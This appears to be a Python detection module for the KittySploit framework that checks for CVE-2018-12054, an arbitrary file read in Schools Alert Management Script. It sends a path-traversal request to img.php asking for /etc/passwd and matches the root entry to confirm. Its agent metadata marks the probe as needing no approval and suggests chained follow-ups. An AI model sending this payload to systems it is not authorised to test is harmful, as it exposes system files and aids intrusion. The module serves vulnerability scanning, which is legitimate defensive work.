#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Schools Alert Management Script is susceptible to an arbitrary file read vulnerability via the f parameter in ."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Schools Alert Management Script - Arbitrary File Read Detection',
        'description': 'Schools Alert Management Script is susceptible to an arbitrary file read vulnerability via the f parameter in img.php, aka absolute path traversal.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'lfi', 'edb', 'schools_alert_management_script_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/44874',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-12054',
            'https://github.com/unh3x/just4cve/issues/4',
            'https://www.exploit-db.com/exploits/44874/',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-12054',
    }

    def run(self):
        r = self.http_request(method="GET", path='/img.php?f=/./etc/./passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Schools Alert Management Script - Arbitrary File Read detected",
                path='/img.php?f=/./etc/./passwd',
            )
            return True
        return False

